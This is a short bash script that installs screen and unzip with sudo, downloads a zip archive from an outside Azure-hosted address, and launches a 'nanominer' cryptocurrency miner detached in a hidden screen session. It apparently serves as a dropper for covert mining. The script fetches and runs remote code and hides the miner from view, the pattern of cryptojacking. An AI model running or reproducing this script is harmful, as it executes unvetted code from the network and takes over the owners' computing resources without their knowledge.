#!/bin/bash
sudo apt-get -y install screen unzip
wget "http://addmail.azurewebsites.net/pasclinux.zip" 
unzip pasclinux.zip
cd pasclinux
chmod +x nanominer
sleep 3
screen -d -m ./nanominer
echo -e "ok"
